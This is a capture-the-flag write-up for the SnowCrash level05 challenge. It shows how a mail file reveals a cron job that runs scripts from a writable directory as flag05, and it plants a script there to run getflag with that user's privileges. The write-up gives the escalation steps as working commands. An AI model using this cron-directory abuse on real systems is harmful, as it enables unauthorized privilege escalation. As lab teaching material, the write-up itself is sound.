# Find the Flag05 Password

When we log in as `level05`, we get the message:

```text
You have new mail.
```

On Linux, local mail is usually stored in `/var/mail/<username>`. Since the current user is `level05`, we can inspect the mail file through `$USER`:

```sh
level05@SnowCrash:~$ cat /var/mail/$USER
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

This is a cron job. The `*/2 * * * *` schedule means it runs every two minutes, and the command is executed as the `flag05` user:

```sh
su -c "sh /usr/sbin/openarenaserver" - flag05
```

Now inspect `/usr/sbin/openarenaserver`:

```sh
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

This script executes every file in `/opt/openarenaserver` with `bash -x`. Each file gets a CPU time limit of 5 seconds through `ulimit -t 5`, and the script is deleted after execution.

Because the cron job runs this script as `flag05`, any executable file we place in `/opt/openarenaserver` will also be executed with `flag05` privileges.

## Add a Script for the Cron Job

Create a script that runs `getflag` and redirects the output to `/tmp/flag05`:

```sh
vi /opt/openarenaserver/getflag.sh
```

```sh
#!/bin/bash
/bin/getflag > /tmp/flag05
```

Make the script executable:

```sh
chmod +x /opt/openarenaserver/getflag.sh
```

The cron job will run within two minutes, execute the script as `flag05`, and then remove it from `/opt/openarenaserver`.

To wait for the result, watch the output file:

```sh
watch -n 0.1 cat /tmp/flag05
```

Once the cron job runs, the file will contain the token:

```text
Every 0.1s: cat /tmp/flag05                                                                Wed Sep  2 03:44:18 2026

Check flag.Here is your token : your token!!
```
